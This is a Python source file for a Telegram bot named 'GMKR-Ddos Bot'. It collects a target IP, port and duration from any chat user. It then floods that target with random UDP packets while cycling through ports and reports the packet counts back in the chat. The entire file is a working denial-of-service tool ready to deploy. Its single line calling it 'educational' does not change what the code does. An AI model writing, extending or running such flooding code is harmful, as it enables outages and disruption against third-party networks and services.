import logging
import socket
import random
import time
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# States for conversation
IP, PORT, DURATION = range(3)

def start(update: Update, context: CallbackContext) -> int:
    """Send a message with a button menu when the command /start is issued."""
    user = update.message.from_user
    logger.info("User %s started the bot.", user.first_name)

    # Create a Start button
    keyboard = [[KeyboardButton("Start Attack")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)

    update.message.reply_text(
        'Welcome to GMKR-Ddos Bot.\n'
        'Press "Start Attack" to begin.',
        reply_markup=reply_markup
    )
    return IP

def get_ip(update: Update, context: CallbackContext) -> int:
    """Get the IP address from user."""
    ip = update.message.text
    # Simple validation for IP format (could be enhanced)
    if not ip.count('.') == 3:
        update.message.reply_text('Invalid IP address format. Please enter again:')
        return IP
    context.user_data['ip'] = ip
    update.message.reply_text('Enter the target port (1-65535):', reply_markup=ReplyKeyboardRemove())
    return PORT

def get_port(update: Update, context: CallbackContext) -> int:
    """Get the port number from user."""
    try:
        port = int(update.message.text)
        if not (1 <= port <= 65535):
            raise ValueError
    except ValueError:
        update.message.reply_text('Invalid port. Enter a port number between 1 and 65535:')
        return PORT
    context.user_data['port'] = port
    update.message.reply_text('Enter the attack duration in seconds:')
    return DURATION

def get_duration(update: Update, context: CallbackContext) -> int:
    """Get the duration and start attack."""
    try:
        duration = int(update.message.text)
        if duration <= 0:
            raise ValueError
    except ValueError:
        update.message.reply_text('Invalid duration. Please enter a positive number for seconds:')
        return DURATION
    context.user_data['duration'] = duration

    update.message.reply_text(
        f"Starting attack on {context.user_data['ip']}:{context.user_data['port']} for {duration} seconds...\n"
        "This tool is ONLY for educational purposes."
    )
    run_ddos(update, context)
    return ConversationHandler.END

def run_ddos(update: Update, context: CallbackContext):
    ip = context.user_data['ip']
    port = context.user_data['port']
    duration = context.user_data['duration']

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)

    sent = 0
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            port += 1
            if port > 65535:
                port = 1
            # Optional: Update status every 50 packets
            if sent % 50 == 0:
                update.message.reply_text(f"Sent {sent} packets to {ip} through port {port}")
        except Exception as e:
            update.message.reply_text(f"Error occurred: {e}")
            break

    update.message.reply_text(f"Attack finished. Total packets sent: {sent}")

def cancel(update: Update, context: CallbackContext) -> int:
    """Cancel conversation."""
    update.message.reply_text('Operation cancelled.', reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

def main():
    # Place your Telegram bot token here
    TOKEN = 'YOUR_BOT_TOKEN_HERE'

    updater = Updater(TOKEN, use_context=True)

    dp = updater.dispatcher

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start), MessageHandler(Filters.regex('^(Start Attack)$'), start)],
        states={
            IP: [MessageHandler(Filters.text & ~Filters.command, get_ip)],
            PORT: [MessageHandler(Filters.text & ~Filters.command, get_port)],
            DURATION: [MessageHandler(Filters.text & ~Filters.command, get_duration)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    dp.add_handler(conv_handler)

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()